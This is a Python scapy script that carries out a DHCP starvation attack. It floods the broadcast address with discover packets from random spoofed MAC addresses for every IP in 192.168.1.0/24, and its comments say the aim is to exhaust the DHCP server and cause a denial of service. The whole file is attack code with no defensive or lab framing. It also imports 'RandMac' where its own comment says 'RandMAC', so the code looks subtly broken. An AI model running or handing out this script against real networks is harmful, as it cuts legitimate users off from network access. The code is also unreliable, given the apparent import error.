#!/usr/bin/python3
import sys
sys.path.append('/usr/local/lib/python3.11/site-packages/scapy')
import scapy.all as scapy
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMac, conf
from scapy.layers.l2 import Ether
from time import sleep
import ipaddress

# conf.checkIPaddr needs to be set to False, since answer will only be accepted by scapy whe it is
# it makes it so IPs dont have to be swapped to count as a response

conf.checkIPaddr = False
possible_ips = [str(ip) for ip in ipaddress.IPv4Network('192.168.1.0/24')]

# Creating DHCP Starvation
# Generate packets with fake MAC addresses, request IPs with them from DHCP server
# Potential DoS (denial of service) as a DHCP server won't be able to assign any more IP addresses

for ip_add in possible_ips:
    # RandMAC() for random mac address
    realHostMAC = RandMac()

    # build discover packet
    broadcast = Ether(

        src=realHostMAC,
        dst="ff:ff:ff:ff:ff:ff"

    )

    ip = IP(

        src="0.0.0.0",
        dst="255.255.255.255"

    )

    udp = UDP(sport=68, dport=67)

    bootp = BOOTP(
        op=1,
        chaddr=realHostMAC
    )

    dhcp = DHCP(options=[

        ("message-type", "discover"),
        ("requested_addr", ip_add),
        ("server-id", "192.168.1.1"),
        ('end')

    ])

    pkt = broadcast / ip / udp / bootp / dhcp

    # DHCP operates on layer 2 of OSI, so sendp to send the packet

    sendp(pkt, iface='eth0', verbose=0)

    sleep(0.4)
    print(f"Sending Packet - {ip_add}")
